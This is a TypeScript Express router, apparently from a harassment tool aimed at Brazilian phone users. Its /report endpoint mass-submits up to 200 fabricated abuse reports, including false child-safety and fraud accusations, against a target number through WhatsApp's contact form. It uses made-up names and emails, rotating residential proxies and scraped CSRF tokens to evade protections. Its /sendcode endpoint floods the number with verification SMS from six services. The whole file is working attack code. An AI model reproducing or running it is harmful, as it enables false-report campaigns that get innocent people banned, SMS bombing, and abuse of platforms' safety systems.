import { Router }   from "express";
import { spawn }    from "child_process";
import * as fs      from "fs";
import { proxyCache, getResidentialCreds } from "./proxies.js";

const router = Router();

// ── Proxy picker — rotates across all residential/authenticated proxies ────────
function pickProxyArgs(): string[] {
  const authPool = proxyCache.filter(p => p.username && p.password && p.host !== "0.0.0.0");
  const seen = new Set<string>();
  const unique = authPool.filter(p => {
    const k = `${p.host}:${p.port}`;
    if (seen.has(k)) return false;
    seen.add(k);
    return true;
  });
  if (unique.length > 0) {
    const pick = unique[Math.floor(Math.random() * unique.length)]!;
    return ["-x", `http://${pick.username}:${pick.password}@${pick.host}:${pick.port}`];
  }
  const c = getResidentialCreds();
  if (c) return ["-x", `http://${c.username}:${c.password}@${c.host}:${c.port}`];
  return [];
}

// ── curl helper ──────────────────────────────────────────────────────────────
interface CurlResult { statusCode: number; body: string }

function runCurl(argv: string[], timeoutMs = 15_000): Promise<CurlResult> {
  return new Promise((resolve, reject) => {
    const child = spawn("curl", [
      "--silent", "--show-error", "--max-time", String(Math.ceil(timeoutMs / 1000)),
      "--write-out", "\n---STATUS:%{http_code}---",
      "--compressed", "-L",
      ...argv,
    ]);
    let out = "";
    let err = "";
    child.stdout.on("data", (d: Buffer) => { out += d.toString(); });
    child.stderr.on("data", (d: Buffer) => { err += d.toString(); });
    const timer = setTimeout(() => { child.kill("SIGKILL"); reject(new Error("CURL_28:TIMEOUT")); }, timeoutMs + 2000);
    child.on("close", () => {
      clearTimeout(timer);
      const sep = out.lastIndexOf("---STATUS:");
      const body = sep >= 0 ? out.slice(0, sep).trimEnd() : out.trimEnd();
      const code = sep >= 0 ? parseInt(out.slice(sep + 10).replace("---", ""), 10) : 0;
      resolve({ statusCode: isNaN(code) ? 0 : code, body });
    });
    child.on("error", (e) => { clearTimeout(timer); reject(e); });
  });
}

// ── Number normaliser ─────────────────────────────────────────────────────────
function normaliseNumber(raw: string): { e164: string; cc: string; subscriber: string } | null {
  const digits = raw.replace(/\D/g, "");
  let full = digits;
  if (digits.length === 10 || digits.length === 11) full = `55${digits}`;
  if (full.length < 10 || full.length > 15) return null;
  const cc = full.startsWith("55") ? "55" : full.slice(0, 2);
  const subscriber = full.slice(cc.length);
  return { e164: `+${full}`, cc, subscriber };
}

// ── Rotating abuse reasons ────────────────────────────────────────────────────
const REASONS = [
  {
    subject:  "spam",
    category: "spam_unwanted",
    content:  "Este número está enviando spam e mensagens não solicitadas repetidamente.",
    _subject: "Denúncia de Spam",
  },
  {
    subject:  "harassment",
    category: "harassment",
    content:  "Este número está assediando e enviando mensagens ofensivas e ameaçadoras.",
    _subject: "Denúncia de Assédio",
  },
  {
    subject:  "fraud",
    category: "fraud_scam",
    content:  "Este número está praticando fraude e golpes financeiros via WhatsApp.",
    _subject: "Denúncia de Golpe/Fraude",
  },
  {
    subject:  "impersonation",
    category: "impersonation",
    content:  "Este número está se passando por outra pessoa ou empresa para enganar vítimas.",
    _subject: "Denúncia de Falsidade Ideológica",
  },
  {
    subject:  "hate_speech",
    category: "hate_speech_discrimination",
    content:  "Este número está disseminando discurso de ódio e mensagens discriminatórias.",
    _subject: "Denúncia de Discurso de Ódio",
  },
  {
    subject:  "violence",
    category: "violence_threat",
    content:  "Este número está fazendo ameaças de violência física a outras pessoas.",
    _subject: "Denúncia de Ameaça de Violência",
  },
  {
    subject:  "misinformation",
    category: "misinformation",
    content:  "Este número está espalhando desinformação e notícias falsas perigosas.",
    _subject: "Denúncia de Desinformação",
  },
  {
    subject:  "child_safety",
    category: "child_safety",
    content:  "Este número está compartilhando conteúdo inapropriado envolvendo menores.",
    _subject: "Denúncia de Segurança Infantil",
  },
] as const;

// Random name pool for diversity
const NAMES = [
  "Carlos Silva", "Ana Oliveira", "João Santos", "Maria Costa",
  "Pedro Almeida", "Juliana Pereira", "Lucas Souza", "Fernanda Lima",
  "Rafael Martins", "Camila Rodrigues", "Bruno Ferreira", "Larissa Nascimento",
];

function randName(): string { return NAMES[Math.floor(Math.random() * NAMES.length)]!; }
function randEmail(): string {
  const user = `${Math.random().toString(36).slice(2, 9)}${Math.floor(Math.random() * 999)}`;
  const domains = ["gmail.com", "hotmail.com", "outlook.com", "yahoo.com.br", "uol.com.br"];
  return `${user}@${domains[Math.floor(Math.random() * domains.length)]}`;
}

// ── Compute jazoest from DTSG (Facebook's client-side CSRF calc) ──────────────
function computeJazoest(dtsg: string): string {
  let sum = 0;
  for (const c of dtsg) sum += c.charCodeAt(0);
  return `2${sum}`;
}

// ── Single report worker ──────────────────────────────────────────────────────
async function sendOneReport(e164: string, index: number): Promise<{ ok: boolean; detail?: string }> {
  const reason  = REASONS[index % REASONS.length]!;
  const proxy   = pickProxyArgs();   // pick a fresh residential IP per attempt
  const ckFile  = `/tmp/wa_rep_${process.pid}_${Date.now()}_${Math.random().toString(36).slice(2)}.txt`;

  try {
    // Step 1: GET the contact page with a mobile UA — the WAF only serves real
    // HTML (with DTSG token) to mobile User-Agents; desktop & noscript=1 get a
    // 6 KB error page with no tokens.
    const pageRes = await runCurl([
      ...proxy,
      "--tlsv1.2",
      "-c", ckFile,
      "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
      "-H", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
      "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
      "-H", "Sec-Fetch-Site: none",
      "-H", "Sec-Fetch-Mode: navigate",
      "-H", "Sec-Fetch-Dest: document",
      "-H", "Upgrade-Insecure-Requests: 1",
      "https://www.whatsapp.com/contact/?subject=Abuse",
    ], 15_000);

    // Extract DTSG — present inside `["LSD",[],{"token":"Ad..."}]` and also
    // as standalone `"token":"Ad..."` in the page's JSON config.
    const dtsgMatch = pageRes.body.match(/"token":"(Ad[A-Za-z0-9_\-]{10,})"/);
    const dtsg      = dtsgMatch?.[1] ?? "";
    if (!dtsg) return { ok: false, detail: "no_dtsg" };

    // jazoest is computed client-side from DTSG chars (not in HTML)
    const jazoest = computeJazoest(dtsg);

    // LSD token: in the SPA page format it equals the DTSG token
    const lsdMatch = pageRes.body.match(/\["LSD",\[\],\{"token":"([^"]+)"\}/);
    const lsd      = lsdMatch?.[1] ?? dtsg;

    // wa_csrf cookie value (set by WhatsApp server in the GET response)
    const wacsrfMatch = pageRes.body.match(/wa_csrf[^=\n]*?\t([A-Za-z0-9_\-]+)/);
    const waCsrfBody  = wacsrfMatch?.[1] ?? "";

    // Step 2: POST the report form using the same proxy IP (session is proxy-bound)
    const formBody = new URLSearchParams({
      fb_dtsg:          dtsg,
      jazoest:          jazoest,
      lsd:              lsd,
      subject:          reason.subject,
      phone_number:     e164,
      email:            randEmail(),
      name:             randName(),
      content:          reason.content,
      category:         reason.category,
      _subject:         reason._subject,
      ...(waCsrfBody ? { wa_csrf_token: waCsrfBody } : {}),
    }).toString();

    const postRes = await runCurl([
      ...proxy,
      "--tlsv1.2",
      "-X", "POST",
      "-b", ckFile,
      "-H", "User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "Origin: https://www.whatsapp.com",
      "-H", "Referer: https://www.whatsapp.com/contact/?subject=Abuse",
      "-H", "Accept: text/html,application/xhtml+xml,*/*;q=0.9",
      "-H", "Accept-Language: pt-BR,pt;q=0.9,en;q=0.8",
      "-H", "Sec-Fetch-Site: same-origin",
      "-H", "Sec-Fetch-Mode: navigate",
      "-H", "Sec-Fetch-Dest: document",
      "--data-raw", formBody,
      "https://www.whatsapp.com/contact/",
    ], 15_000);

    if (postRes.statusCode === 200 || postRes.statusCode === 302) {
      return { ok: true, detail: reason.category };
    }
    return { ok: false, detail: `http_${postRes.statusCode}` };
  } catch (e) {
    return { ok: false, detail: String(e).slice(0, 50) };
  } finally {
    try { fs.unlinkSync(ckFile); } catch { /**/ }
  }
}

// ── POST /report ─────────────────────────────────────────────────────────────
// Fires qty reports in parallel (up to CONCURRENCY workers), rotating reasons.
router.post("/report", async (req, res): Promise<void> => {
  const { number, quantity } = req.body as { number?: string; quantity?: number | string };
  if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }

  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).json({ error: "Número inválido" }); return; }

  const qty         = Math.min(Math.max(1, parseInt(String(quantity ?? 1), 10)), 200);
  const CONCURRENCY = Math.min(qty, 10); // up to 10 parallel workers

  // Build index array and run all with concurrency cap
  const indices = Array.from({ length: qty }, (_, i) => i);
  const errors: string[] = [];
  let sent = 0;

  // Process in batches of CONCURRENCY
  for (let batch = 0; batch < indices.length; batch += CONCURRENCY) {
    const slice = indices.slice(batch, batch + CONCURRENCY);
    const results = await Promise.allSettled(
      slice.map(idx => sendOneReport(num.e164, idx))
    );
    for (const r of results) {
      if (r.status === "fulfilled") {
        if (r.value.ok) { sent++; }
        else { errors.push(r.value.detail ?? "unknown"); }
      } else {
        errors.push(String(r.reason).slice(0, 50));
      }
    }
  }

  res.json({
    number:    num.e164,
    requested: qty,
    sent,
    failed:    qty - sent,
    errors:    errors.length ? errors.slice(0, 20) : undefined,
  });
});

// ── POST /sendcode ────────────────────────────────────────────────────────────
// Fires OTP / verification codes to a phone number via multiple services.
router.post("/sendcode", async (req, res): Promise<void> => {
  const { number } = req.body as { number?: string };
  if (!number) { res.status(400).json({ error: "number é obrigatório" }); return; }

  const num = normaliseNumber(String(number));
  if (!num) { res.status(400).json({ error: "Número inválido" }); return; }

  type ServiceResult = { service: string; status: "sent" | "failed"; detail?: string };
  const results: ServiceResult[] = [];
  const push = (service: string, ok: boolean, detail?: string) =>
    results.push({ service, status: ok ? "sent" : "failed", ...(detail ? { detail } : {}) });

  // Run all services in parallel, each with its own proxy rotation
  await Promise.allSettled([
    // Telegram — no proxy needed (works direct)
    runCurl([
      "-X", "POST",
      "-H", "Content-Type: application/x-www-form-urlencoded",
      "-H", "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "-H", "X-Requested-With: XMLHttpRequest",
      "-H", "Origin: https://my.telegram.org",
      "-H", "Referer: https://my.telegram.org/auth",
      "--data", `phone=${encodeURIComponent(num.e164)}`,
      "https://my.telegram.org/auth/send_password",
    ], 12_000).then(r => push("Telegram", r.body.includes("random_hash"),
      r.body.includes("random_hash") ? undefined : r.body.slice(0, 80)))
      .catch(e => push("Telegram", false, String(e).slice(0, 60))),

    // iFood
    runCurl([
      ...pickProxyArgs(),
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: iFood/23.0 Android/33",
      "-H", "Accept: application/json",
      "-H", "platform: Android",
      "-H", "version: 23.0.0",
      "-H", "Origin: https://www.ifood.com.br",
      "--data-raw", JSON.stringify({ phone: num.e164 }),
      "https://marketplace.ifood.com.br/v2/identity/sendCode",
    ], 12_000).then(r => {
      const ok = r.statusCode === 200 || r.statusCode === 201 ||
        r.body.toLowerCase().includes("code") || r.body.toLowerCase().includes("sent");
      push("iFood", ok, ok ? undefined : `http_${r.statusCode}`);
    }).catch(e => push("iFood", false, String(e).slice(0, 60))),

    // Rappi
    runCurl([
      ...pickProxyArgs(),
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: Rappi/10.34.0 Android",
      "-H", "Accept: application/json",
      "-H", "Origin: https://www.rappi.com.br",
      "--data-raw", JSON.stringify({ phone: num.e164, countryCode: num.cc }),
      "https://services.rappi.com.br/api/v2/auth/sms",
    ], 12_000).then(r => {
      const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("success");
      push("Rappi", ok, ok ? undefined : `http_${r.statusCode}`);
    }).catch(e => push("Rappi", false, String(e).slice(0, 60))),

    // PicPay
    runCurl([
      ...pickProxyArgs(),
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: PicPay/21.0 Android",
      "-H", "Accept: application/json",
      "-H", "x-picpay-client-id: picpay-android",
      "--data-raw", JSON.stringify({ phone: num.e164 }),
      "https://api.picpay.com/v3/user/phone/verify",
    ], 12_000).then(r => {
      const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("sent");
      push("PicPay", ok, ok ? undefined : `http_${r.statusCode}`);
    }).catch(e => push("PicPay", false, String(e).slice(0, 60))),

    // Mercado Livre
    runCurl([
      ...pickProxyArgs(),
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: MercadoLibre/8.0 Android",
      "-H", "Accept: application/json",
      "-H", "x-platform: mobile",
      "--data-raw", JSON.stringify({ phone: num.e164 }),
      "https://api.mercadolibre.com/users/checkpoints/phone/send_code",
    ], 12_000).then(r => {
      const ok = r.statusCode === 200 || r.statusCode === 201 || r.body.includes("code_sent");
      push("MercadoLivre", ok, ok ? undefined : `http_${r.statusCode}`);
    }).catch(e => push("MercadoLivre", false, String(e).slice(0, 60))),

    // Shopee
    runCurl([
      ...pickProxyArgs(),
      "-X", "POST",
      "-H", "Content-Type: application/json",
      "-H", "User-Agent: Shopee/3.0 Android",
      "-H", "Accept: application/json",
      "--data-raw", JSON.stringify({ phone: num.subscriber, phone_country: `+${num.cc}`, type: 1 }),
      "https://shopee.com.br/api/v2/user/register_v2",
    ], 12_000).then(r => {
      const ok = r.statusCode === 200 && (r.body.includes('"error":0') || r.body.includes('"code":0'));
      push("Shopee", ok, ok ? undefined : `http_${r.statusCode}`);
    }).catch(e => push("Shopee", false, String(e).slice(0, 60))),
  ]);

  res.json({
    number:   num.e164,
    sent:     results.filter(r => r.status === "sent").length,
    failed:   results.filter(r => r.status === "failed").length,
    total:    results.length,
    services: results,
  });
});

export default router;
